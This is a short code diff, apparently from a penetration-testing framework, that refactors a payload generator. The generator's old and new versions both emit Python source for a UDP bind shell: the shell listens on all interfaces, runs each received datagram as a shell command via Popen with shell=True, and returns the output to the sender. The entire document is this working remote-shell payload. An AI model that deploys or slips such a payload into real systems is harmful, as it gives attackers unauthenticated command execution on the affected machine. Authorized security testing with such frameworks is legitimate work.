@@ -22,12 +22,15 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "from subprocess import Popen,PIPE\n" +
-            "from socket import socket, AF_INET, SOCK_DGRAM\n" +
-            "s=socket(AF_INET,SOCK_DGRAM)\n" +
-            "s.bind(('0.0.0.0',{}))\n".format(self.rport) +
-            "while 1:\n"
-            "\tdata,addr=s.recvfrom(1024)\n" +
-            "\tout=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate()\n" +
-            "\ts.sendto(''.join([out[0],out[1]]),addr)\n"
-        )
+            (
+                (
+                    "from subprocess import Popen,PIPE\n"
+                    + "from socket import socket, AF_INET, SOCK_DGRAM\n"
+                    + "s=socket(AF_INET,SOCK_DGRAM)\n"
+                    + f"s.bind(('0.0.0.0',{self.rport}))\n"
+                )
+                + "while 1:\n"
+                "\tdata,addr=s.recvfrom(1024)\n"
+            )
+            + "\tout=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate()\n"
+        ) + "\ts.sendto(''.join([out[0],out[1]]),addr)\n"
